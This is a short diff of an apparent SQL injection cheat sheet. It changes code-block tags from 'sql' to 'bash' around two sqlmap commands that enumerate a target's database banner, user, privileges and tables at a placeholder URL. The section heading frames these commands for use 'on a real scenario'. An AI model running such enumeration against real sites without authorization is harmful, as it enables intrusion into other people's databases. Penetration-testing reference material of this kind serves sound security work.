@@ -39,10 +39,10 @@
 ## SQLMap Payloads in order to use on a real scenario
 
 1. Basic Enumeration
-```sql
+```bash
 sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
 ```
 2. Table Enumeration
-```sql
+```bash
 sqlmap -u "http://www.example.com/?id=1" --tables -D [DATABASE_NAME]
 ```
